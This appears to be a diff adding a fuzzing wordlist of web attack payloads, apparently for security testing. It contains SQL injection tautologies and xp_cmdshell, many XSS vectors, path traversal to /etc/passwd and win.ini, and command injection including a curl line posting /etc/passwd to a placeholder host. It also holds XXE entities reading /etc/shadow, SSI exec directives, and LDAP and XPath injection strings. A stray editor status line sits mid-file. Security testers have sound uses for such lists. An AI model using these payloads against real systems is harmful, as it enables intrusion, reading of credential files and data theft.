@@ -1,0 +1,931 @@
+
+true
+yes
+a
+A
+1
+10
+1000
+10000
+100000
+1000000
+10000000
+100000000
+1000000000
+10000000000
+100000000000
+1000000000000
+10000000000000
+100000000000000
+1000000000000000
+10000000000000000
+100000000000000000
+1000000000000000000
+10000000000000000000
+100000000000000000000
+1000000000000000000000
+10000000000000000000000
+100000000000000000000000
+1000000000000000000000000
+10000000000000000000000000
+100000000000000000000000000
+1000000000000000000000000000
+10000000000000000000000000000
+100000000000000000000000000000
+1000000000000000000000000000000
+0
+-0
+-1
+-999999999999999999999999
+0x11
+0xaa
+\xaa
+\\xaa
+\\\\xaa
+(1)
+\(1\)
+$1
+1.0
+0.1
+1,1
+1.1
+1.1.1
+0,1
+[1]
+'
+"
+/
+!
+º
+ª
+\
+\\
+\\\
+\\\\
+\\\\\
+\\\\\\
+]]>
+#
+~
+½
+¬
+{
+[
+]
+{
+}
+`
++
+*
+``
+?
+¿
+¿?
+,
+.
+;
+:
+%
+&
+=
+-
+_
+<
+*
+>
+1>
+1<
+1'
+1"
+1\'
+1\"
+1-1
+1+1
+1*1
+1<<1
+1>>1
+1~1
+-1'OR (69=69)#
+'or1=1#
+1=1'or''='
+1=1'or'1'='1
+'or'?'='?
+'or'&'='&
+1or1=1
+1or1=1--
+1and1=1
+1and1=1--
+/*&password=*/'or''='
+@'or''='
+@'or'1'='1
+'or''='
+'and'1'='1
+'and'1'='2
+admin
+ad'+'min
+'/**/or''='
+' /**/or'' =''
+' o/**/r/**/'' =''
+' or ""/**/=/**/''
+' or ' ' ='
+' or '' =''
+' or ''/**/=''
+' or'' ='
+' or'' =''
+' or''/**/=/**/''
+' or''='
+' or/**/ ''=''
+'/**/o/**/r/**/'' =''
+'/**/or ""/**/=/**/''
+'/**/or '' =''
+'/**/or'' =''
+'/**/or''/**/=/**/''
+'/**/or/**/ ""/**/=/**/''
+'o/**/r/**/'' =''
+'or ""/**/=/**/''
+'or ' ' =''
+'or ' '/*hola*/=''
+'or '' =''
+'or"" ="
+'or'' ='
+'or'' =''
+'or''/**/=/**/''
+'or''/*hola*/=''
+'or/**/ ""/**/=/**/''
+/**/or /**/ '' =''
+/**/or'' =''
+1/4 script 3/4 alert(¢XSS¢) 1/4 /script 3/4
+</HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+<A HREF="//google">XSS</A>
+<A HREF="//www.google.com/">XSS</A>
+<A HREF="htt    p://6&#9;6.000146.0x7.147/">XSS</A>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<A HREF="http://1113982867/">XSS</A>
+<A HREF="http://66.102.7.147/">XSS</A>
+<A HREF="http://google.com/">XSS</A>
+<A HREF="http://google:hu.org">XSS</A>
+<A HREF="http://hu@google">XSS</A>
+<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
+<A HREF="http://www.google.com./">XSS</A>
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+<BASE HREF="javascript:alert('XSS');//">
+<DIV
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+<SCRIPT>alert('XSS');</SCRIPT>
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=CDATAFORMATAS=HTML></SPAN>
+<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<XSS STYLE="xss:expression(alert('XSS'))">
+STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+and 2=0
+and 2=0#mysql
+and 2=0--oracle
+and 2=2
+and 2=2#mysql
+and 2=2--oracle
+and USER=USER
+exp/*<A STYL))'>E='no\xss:noxss("*//*");
+o/* humble */r '' =''
+or ""
+or /**/ '' =''
+or 1=1
+or 2=2
+order by 1--
+xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"
+!
+"
+""
+""or""""=""
+"><h1>ITWORKS</h1><!--
+"nulls.txt" 46L, 5221C
+#
+#mysql
+$
+%
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+%%20d
+%%22
+%%22%%22
+%%27
+%%27%%27
+%%32
+%%327
+%%32fboot.ini
+%%32fetc%%32fpasswd
+%%32fwin.ini
+%%35cboot.ini
+%%35cwin.ini
+%0
+%00
+%00%01%02%03%04%05%06%07%08%09%0a%0b%0c%0d%0e%0f%10%11%12%13%14%15%16%17%18%19%1a%1b%1c%1d%1e%1f%20%21%22%23%24%25%26%27%28%29%2a%2b%2c%2d%2e%2f%30%31%32%33%34%35%36%37%38%39%3a%3b%3c%3d%3e%3f%40%41%42%43%44%45%46%47%48%49%4a%4b%4c%4d%4e%4f%50%51%52%53%54%55%56%57%58%59%5a%5b%5c%5d%5e%5f%60%61%62%63%64%65%66%67%68%69%6a%6b%6c%6d%6e%6f%70%71%72%73%74%75%76%77%78%79%7a%7b%7c%7d%7e%7f%80%81%82%83%84%85%86%87%88%89%8a%8b%8c%8d%8e%8f%90%91%92%93%94%95%96%97%98%99%9a%9b%9c%9d%9e%9f%a0%a1%a2%a3%a4%a5%a6%a7%a8%a9%aa%ab%ac%ad%ae%af%b0%b1%b2%b3%b4%b5%b6%b7%b8%b9%ba%bb%bc%bd%be%bf%c0%c1%c2%c3%c4%c5%c6%c7%c8%c9%ca%cb%cc%cd%ce%cf%d0%d1%d2%d3%d4%d5%d6%d7%d8%d9%da%db%dc%dd%de%df%e0%e1%e2%e3%e4%e5%e6%e7%e8%e9%ea%eb%ec%ed%ee%ef%f0%f1%f2%f3%f4%f5%f6%f7%f8%f9%fa%fb%fc%fd%fe%ff
+%00dir|
+%0d%0a/etc/hosts
+%0d%0a/etc/passwd
+%01
+%10
+%11
+%12
+%13
+%14
+%15
+%16
+%17
+%18
+%19
+%1a
+%1b
+%1c
+%1d
+%1e
+%1f
+%02
+%20
+%21
+%22
+%22%22
+%23
+%24
+%25
+%25%32%32
+%25%32%32%25%32%32
+%25%32%35%25%33%32%25%33%32
+%25%32%35%25%37%33%25%37%39%25%37%33%25%37%34%25%36%35%25%36%64%25%37%32%25%36%66%25%36%66%25%37%34%25%32%35%25%37%32%25%36%35%25%37%30%25%36%31%25%36%39%25%37%32%25%37%33%25%36%31%25%36%64
+%25%32%37
+%25%32%37%25%32%37
+%25%32%37%25%36%66%25%37%32%25%32%62%25%33%31%25%32%62%25%36%39%25%36%65%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%62%25%33%31%25%32%62%25%36%36%25%37%32%25%36%66%25%36%64%25%32%62%25%36%31%25%36%63%25%36%63%25%35%66%25%37%35%25%37%33%25%36%35%25%37%32%25%37%33%25%32%39%25%32%64%25%32%64
+%25%32%37%25%36%66%25%37%32%25%32%62%25%33%31%25%32%62%25%36%39%25%36%65%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%62%25%33%31%25%32%62%25%36%36%25%37%32%25%36%66%25%36%64%25%32%62%25%36%34%25%36%32%25%36%31%25%35%66%25%37%35%25%37%33%25%36%35%25%37%32%25%37%33%25%32%39%25%32%64%25%32%64
+%25%32%37or%25%32%37%25%32%37=%25%32%37
+%25%32%37or1=1--
+%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
+%25%33%62%25%36%34%25%36%39%25%37%32
+%25%33%62%25%36%63%25%37%33%25%32%35%25%33%32%25%33%36%25%32%30%25%32%33
+%25%35%63%25%32%32
+%25%35%63%25%32%37
+%25%36%30%25%36%34%25%36%39%25%37%32%25%36%30
+%25%36%34%25%36%39%25%37%32%25%37%63
+%25%36%46%25%37%32
+%25%37%63%25%36%34%25%36%39%25%37%32
+%25%73%79%73%74%65%6d%72%6f%6f%74%25%72%65%70%61%69%72%73%61%6d
+%255c
+%255c%%27
+%26
+%26#34;
+%26#34;%26#34;
+%26#39;
+%26#39;26#39;
+%26#92;%26#34;
+%26#92;%26#39;
+%26%26ls
+%27
+%27%27
+%27%5c%5c%c2%aa%21%7c%40%22%5c%27%c2%ba%24%c2%b7%25%26%2f%28%29%3d%3f%c2%bf%c2%a1%5e%2a%2b%60%5c%27%c3%a7%7d%7b%5d%5b%2d%5f%2e%3a%2c%3b%3c%3e
+%28
+%29
+%2a
+%2b
+%2c
+%2d
+%2e
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwin.ini
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini%00
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwin.ini
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwin.ini%00
+%2f
+%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
+%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwin.ini
+%2f%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%2fboot.ini
+%2fetc%2fpasswd
+%2fwin.ini
+%03
+%30
+%31
+%32
+%33
+%34
+%35
+%36
+%37
+%38
+%39
+%3a
+%3b
+%3c
+%3d
+%3e
+%3f
+%04
+%40
+%41
+%42
+%43
+%44
+%45
+%46
+%47
+%48
+%49
+%4a
+%4b
+%4c
+%4d
+%4e
+%4f
+%05
+%50
+%51
+%52
+%53
+%54
+%55
+%56
+%57
+%58
+%58%35%4f%21%50%25%40%41%50%5b%34%5c%50%5a%58%35%34%28%50%5e%29%37%43%43%29%37%7d%24%45%49%43%41%52%2d%53%54%41%4e%44%41%52%44%2d%41%4e%54%49%56%49%52%55%53%2d%54%45%53%54%2d%46%49%4c%45%21%24%48%2b%48%2a
+%59
+%5a
+%5b
+%5c
+%5c%22
+%5c%27
+%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
+%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini%00
+%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwin.ini
+%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwin.ini%00
+%5cboot.ini
+%5cwin.ini
+%5d
+%5e
+%5f
+%06
+%60
+%60%73%6c%65%65%70%20%33%30%60
+%61
+%62
+%63
+%64
+%65
+%66
+%67
+%68
+%69
+%6F%72
+%6a
+%6b
+%6c
+%6d
+%6e
+%6f
+%07
+%70
+%71
+%72
+%73
+%74
+%75
+%76
+%77
+%78
+%79
+%7a
+%7b
+%7c
+%7c%40%23%5c%3c%3e%2c%2e%2d%5f%3a%3b%7b%7d%25%32%37%c3%a7%22%60%2b%5b%5d%5e%2a%25%32%37%c2%a1%3f%c2%bf%28%29%2f%5c%c2%ac%25%24%c2%b7
+%7d
+%7e
+%7f
+%08
+%80
+%81
+%82
+%83
+%84
+%85
+%86
+%87
+%88
+%89
+%8a
+%8b
+%8c
+%8d
+%8e
+%8f
+%09
+%90
+%91
+%92
+%9239
+%93
+%94
+%95
+%96
+%97
+%98
+%99
+%9a
+%9b
+%9c
+%9d
+%9e
+%9f
+%0a
+%a0
+%a1
+%a2
+%a3
+%a4
+%a5
+%a6
+%a7
+%a8
+%a9
+%aa
+%ab
+%ac
+%ad
+%ae
+%af
+%0b
+%b0
+%b1
+%b2
+%b3
+%b4
+%b5
+%b6
+%b7
+%b8
+%b9
+%ba
+%bb
+%bc
+%bd
+%be
+%bf
+%0c
+%c0
+%c1
+%c2
+%c3
+%c4
+%c5
+%c6
+%c7
+%c8
+%c9
+%ca
+%cb
+%cc
+%cd
+%ce
+%cf
+%0d
+%d0
+%d1
+%d2
+%d3
+%d4
+%d5
+%d6
+%d7
+%d8
+%d9
+%da
+%db
+%dc
+%dd
+%de
+%df
+%0e
+%e0
+%e1
+%e2
+%e3
+%e4
+%e5
+%e6
+%e7
+%e8
+%e9
+%ea
+%eb
+%ec
+%ed
+%ee
+%ef
+%0f
+%f0
+%f1
+%f2
+%f3
+%f4
+%f5
+%f6
+%f7
+%f8
+%f9
+%fa
+%fb
+%fc
+%fd
+%fe
+%ff
+%s%s%s%s%s%s%s%s%s%s
+%systemroot%\repair\sam
+%u0022
+%u0027
+&
+'
+' and '2'='0
+' and '2'='0'#mysql
+' and '2'='0'--oracle
+' and '2'='2
+' and '2'='2'#mysql
+' and '2'='2'--oracle
+' or ""
+' or '2'='2
+' or/**/ ""/**/=/**/''
+'!ls
+'#mysql
+''
+'';!--"<XSS>=&{()}
+''or''''=''
+'.system('ls').'
+'/*mysql
+'/*ora_mysql*/and/**/'2'='0
+'/*ora_mysql*/and/**/'2'='2
+'/*ora_mysql*/or/**/'2'='2
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+';ls
+'>x
+'\\ª!|@"\'º$·%&/()=?¿¡^*+`\'ç}{][-_.:,;<>%00&#39;
+'\\ª!|@"\º$·%&/()=?¿¡^*+`\ç}{][-_.:,;<>%00&#39;
+$;ls
+$;ls\n
+'`ls`
+'or 1=1 or ''='
+'or+1+in(select+1+from+all_users)--
+'or+1+in(select+1+from+dba_users)--
+'|ls
+(
+(2)
+(2)1
+)
+))
+)))
+))))
+)))))
+))))))
+)))))))
+))))))))
+)))))))))
+))))))))))
+)))))))))))
+*
+1)(|(cn=*
+*)(|(cn=*))
+*))))));cn;
+*)))));cn;
+*))));cn;
+*)));cn;
+*));cn;
+*);cn;
++
++HTTP/1.0%0d%0a%0d%0a%00
+,
+,,
+,null
+,null,null
+,null,null,null
+,null,null,null,null
+,null,null,null,null,null
+,null,null,null,null,null,null
+,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+-
+--
+--ora_sqls
+-1
+-99
+.
+.*|
+$(CMD=http://host;curl$IFS-d$IFS@/etc/passwd$IFS$CMD)
+CMD=http://host;curl$IFS-d$IFS@/etc/passwd$IFS$CMD
+$(sleep$IFS$SYSTEMD_EXEC_PID)
+$(cat$IFS/etc/passwd)
+|cat$IFS/etc/passwd
+;cat$IFS/etc/passwd
+(cat$IFS/etc/passwd)
+&&cat$IFS/etc/passwd
+..
+../../../../../../../../../boot.ini
+../../../../../../../../../boot.ini%00
+../../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd%00
+../../../../../../../../../win.ini
+../../../../../../../../../win.ini%00
+..\..\..\..\..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\..\..\..\..\boot.ini%00
+..\..\..\..\..\..\..\..\..\..\..\win.ini
+..\..\..\..\..\..\..\..\..\..\..\win.ini%00
+..\..\..\..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\etc\passwd%00
+count(/child::node())
+x' or name()='username' or 'x'='y
+<name>','')); phpinfo(); exit;/*</name>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+/
+/*
+/*mysql
+/*ora_mysql*/and/**/2=0
+/*ora_mysql*/and/**/2=2
+/../../../../../../../../../boot.ini
+/../../../../../../../../../boot.ini%00
+/../../../../../../../../../etc/passwd
+/../../../../../../../../../etc/passwd%00
+/../../../../../../../../../win.ini
+/../../../../../../../../../win.ini%00
+//
+//users[LoginID/text()='abc' or 1=1 or 'a'='b' and passwd/text()='']
+/boot.ini
+/etc/passwd
+/etc/passwd%00
+/win.ini
+0
+0,0
+0,0,0
+0,0000000000001
+0,1
+0.0
+0.0.0
+0.000000000000000001
+0.0000000000000001
+0.1
+0.9
+0.9999999
+00000000000000000000000000000000000000000000001
+0000000001
+000001
+001
+01
+0x0
+0x100
+0x10000
+0x3fffffff
+0x7f
+0x7fff
+0x7ffff
+0x7ffffffe
+0x7fffffff
+0x80
+0x8000
+0x80000000
+0xff
+0xff7f
+0xffff
+0xffffffff
+1
+1(2)
+1,000000000
+1,00000001
+1,99999999
+1.1.1
+1111111111111
+1e100
+2 or 2=2
+2' or '2'='2
+2*2
+2+2
+2+2+2
+2^2
+2e2
+2p2
+4294967294
+7fffffff
+9999
+99999999999
+999999999999999999
+999999999999999999999999999
+999999999999999999999999999999999999999999999999999999
+9e9
+:
+;
+;dir
+;ls%26+#
+<!--%23echo var="DATE_LOCAL"-->
+<!--%23echo+var="DATE_LOCAL"-->
+<!--%23exec+cmd="/bin/date"-->
+<!--%23exec+cmd="/usr/bin/date"-->
+<!--%23exec+cmd="date"-->
+<!--%23exec+cmd="dir"-->
+<!--%23exec+cmd="ls"-->
+<!--%23include+virtual="/etc/passwd" -->
+<!--%23include+virtual="/footer.html" -->
+<%systemroot%\repair\sam
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+</etc/passwd
+</password>
+</xml>
+</xml>test
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<BGSOUND SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BR SIZE="&{alert('XSS')}">
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG SRC="jav   ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="livescript:[code]">
+<IMG SRC="mocha:[code]">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=`javascript:alert("'XSS'")`>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert('VINGTSUN')>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
